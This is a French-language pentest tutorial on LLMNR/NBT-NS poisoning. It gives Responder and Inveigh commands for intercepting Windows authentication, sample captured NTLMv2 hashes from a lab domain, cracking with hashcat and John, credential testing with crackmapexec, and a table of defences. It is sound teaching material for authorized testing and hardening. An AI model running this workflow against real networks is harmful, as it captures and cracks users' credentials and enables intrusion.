# Poisoning LLMNR et NBT-NS

Quand la resolution DNS echoue, Windows utilise des protocoles de repli (LLMNR, NBT-NS) qui diffusent la requete sur le reseau local. N'importe quel hote peut repondre. En se positionnant comme repondeur, on intercepte les tentatives d'authentification et on capture des hashes NTLMv2 qu'on peut ensuite cracker offline.

## Pourquoi

Le poisoning LLMNR/NBT-NS est souvent le premier foothold obtenu lors d'un pentest interne. Il ne necessite aucun identifiant, aucune vulnerabilite logicielle. Il suffit d'etre sur le meme segment reseau et d'attendre qu'un utilisateur fasse une faute de frappe dans un chemin UNC ou qu'une GPO reference un partage qui n'existe plus. C'est un vecteur d'attaque passif, silencieux, et extremement efficace.

## Comment ca marche

### Le mecanisme de resolution

1. Un utilisateur tape `\\imprimante01` au lieu de `\\imprimante1`
2. Le DNS repond : "je ne connais pas cet hote"
3. Windows diffuse une requete LLMNR (port 5355/UDP) puis NBT-NS (port 137/UDP) sur le reseau local : "quelqu'un connait imprimante01 ?"
4. Notre machine (avec Responder) repond : "c'est moi !"
5. Le poste de la victime envoie une requete d'authentification avec le hash NTLMv2 de l'utilisateur
6. On capture le hash et on le crack offline

{% hint style="warning" %}
Le poisoning LLMNR/NBT-NS ne fonctionne que si on est dans le meme broadcast domain (meme VLAN) que la victime. Si on est connecte via VPN, on ne recevra pas les requetes broadcast. C'est pour cette raison que les clients qui choisissent un test via VPN limitent les vecteurs d'attaque disponibles.
{% endhint %}

### Depuis Linux : Responder

```bash
# - Lancer Responder en mode actif
sudo responder -I eth0 -wFb

# -I : interface reseau
# -w : activer le serveur WPAD proxy
# -F : forcer l'authentification WPAD
# -b : activer l'authentification HTTP de base
```

Quand un hash est capture, Responder l'affiche en console et le sauvegarde dans des logs :

```
[+] Listening for events...

[*] [NBT-NS] Poisoned answer sent to 172.16.5.25 for name PRINTER01
[SMB] NTLMv2-SSP Client   : 172.16.5.25
[SMB] NTLMv2-SSP Username : INLANEFREIGHT\svc_qualys
[SMB] NTLMv2-SSP Hash     : svc_qualys::INLANEFREIGHT:a]...hash...
```

#### Cracker le hash

```bash
# - Identifier le type de hash (NTLMv2 = mode 5600 dans Hashcat)
hashcat -m 5600 hash.txt /opt/wordlists/rockyou.txt

# - Ou avec John
john --wordlist=/opt/wordlists/rockyou.txt hash.txt
```

Les hashes captures sont stockes dans `/opt/Responder/logs/`. On peut aussi les recuperer avec :

```bash
cat /opt/Responder/logs/SMB-NTLMv2-SSP-*.txt
```

### Depuis Windows : Inveigh

Quand on est deja sur un poste Windows (managed workstation, VDI), Inveigh est l'equivalent de Responder.

{% tabs %}
{% tab title="PowerShell" %}
```powershell
# - Importer le module
Import-Module .\Inveigh.ps1

# - Lancer le poisoning (necessite admin local)
Invoke-Inveigh Y -NBNS Y -ConsoleOutput Y -FileOutput Y
```
{% endtab %}
{% tab title="C# (InveighZero)" %}
```powershell
# - Lancer la version C# (plus stable, console semi-interactive)
.\Inveigh.exe

# - Commandes dans la console Inveigh
# GET NTLMV2UNIQUE : afficher les hashes uniques captures
# GET NTLMV2USERNAMES : lister les utilisateurs captures
```
{% endtab %}
{% endtabs %}

{% hint style="info" %}
Inveigh en C# offre une console interactive qui permet de consulter les hashes captures en temps reel. La version PowerShell est plus simple mais moins riche en fonctionnalites. Les deux necessitent des privileges d'administrateur local.
{% endhint %}

### Mesures defensives

| Mesure | Impact |
|---|---|
| Desactiver LLMNR (GPO) | Supprime le vecteur principal |
| Desactiver NBT-NS (interface reseau) | Supprime le vecteur secondaire |
| Activer le Network Access Control (NAC) | Empeche les machines non autorisees de se connecter |
| Forcer SMB Signing | Empeche les attaques de relay SMB |
| Segmentation reseau | Limite la portee du poisoning au VLAN de l'attaquant |

Pour desactiver LLMNR via GPO :
`Computer Configuration → Administrative Templates → Network → DNS Client → Turn OFF Multicast Name Resolution → Enabled`

Pour desactiver NBT-NS : adapter le DHCP ou configurer manuellement chaque interface reseau.

## En pratique

```bash
# Workflow complet de poisoning

# 1 - Lancer Responder
sudo responder -I eth0 -wFb

# 2 - Attendre... (patience, ca peut prendre des minutes ou des heures)

# 3 - Quand un hash est capture, le copier
cat /opt/Responder/logs/SMB-NTLMv2-SSP-172.16.5.25.txt

# 4 - Cracker avec Hashcat
hashcat -m 5600 hash.txt /opt/wordlists/rockyou.txt --rules-file /opt/hashcat/rules/d3ad0ne.rule

# 5 - Tester les identifiants obtenus
crackmapexec smb 172.16.5.5 -u svc_qualys -p '<PASSWORD>'
```

## Pieges et galeres

- **Aucun hash capture** : c'est normal dans les environnements bien configures (LLMNR desactive). Passer a d'autres techniques (password spraying, Kerberos)
- **NTLMv1 vs NTLMv2** : NTLMv1 (mode 5500) est plus facile a cracker mais rare en environnement moderne. NTLMv2 (mode 5600) est la norme
- **Hash resistant au cracking** : un mot de passe complexe de 15+ caracteres peut resister meme avec de bonnes wordlists. Essayer le relay SMB comme alternative (si SMB Signing est desactive)
- **Detection** : Responder genere du trafic anormal. Un SOC qui monitore les requetes LLMNR/NBT-NS detectera l'activite. En pentest non-evasif, ce n'est pas un probleme

## Retour terrain

Le poisoning LLMNR est un des vecteurs les plus fiables en pentest interne. Sur les environnements ou il n'est pas desactive (encore une majorite), on obtient generalement des hashes dans les 15 premieres minutes. Le cracking depend de la complexite des mots de passe. Les comptes de service (svc_*) sont souvent les plus interessants car ils ont des mots de passe faibles et des privileges eleves.

L'alternative la plus courante quand le poisoning ne donne rien : le password spraying. Les deux techniques sont complementaires et s'executent en parallele.

## Memo express

| Outil | Plateforme | Commande |
|---|---|---|
| Responder (actif) | Linux | `sudo responder -I eth0 -wFb` |
| Responder (passif) | Linux | `sudo responder -I eth0 -A` |
| Inveigh (PS) | Windows | `Invoke-Inveigh Y -NBNS Y -ConsoleOutput Y` |
| Inveigh (C#) | Windows | `.\Inveigh.exe` |
| Hashcat NTLMv2 | Cross-platform | `hashcat -m 5600 hash.txt wordlist.txt` |

***
